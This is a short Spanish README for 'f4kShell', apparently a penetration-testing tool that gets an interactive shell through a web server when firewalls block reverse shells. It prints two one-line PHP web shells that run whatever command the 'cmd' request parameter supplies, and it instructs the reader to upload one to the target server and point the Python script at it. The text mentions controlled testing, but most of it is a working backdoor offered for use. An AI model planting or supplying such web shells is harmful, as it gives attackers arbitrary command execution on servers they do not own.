# f4kShell

* En entornos reales suelen existir reglas de red y restricciones (p. ej. reglas de firewall o filtros que bloquean conexiones salientes) que impiden establecer shells reversas tradicionales. Por eso, en pruebas controladas es interesante estudiar técnicas alternativas para recuperar una sesión interactiva y entender los riesgos asociados a la ejecución remota de comandos desde un servidor web.

* Basta con colocar en el servidor un archivo PHP similar al mostrado abajo, cuyo propósito es ejecutar comandos en el entorno remoto.

```php
<?php
	echo shell_exec($_REQUEST['cmd']);
?>
```
ó

```php
<?php
      system($_REQUEST['cmd']);
?>
```

* Con el archivo ya en el servidor, basta ejecutar el script (no olvides modificar la ruta del "cmd.php" dentro del script 
"f4kshell.py"para que apunte al fichero PHP y ruta correcta). Abajo se muestra un ejemplo de lo que permite realizar.

![imagen](https://i.ibb.co/8n5hZHWs/cara.png)
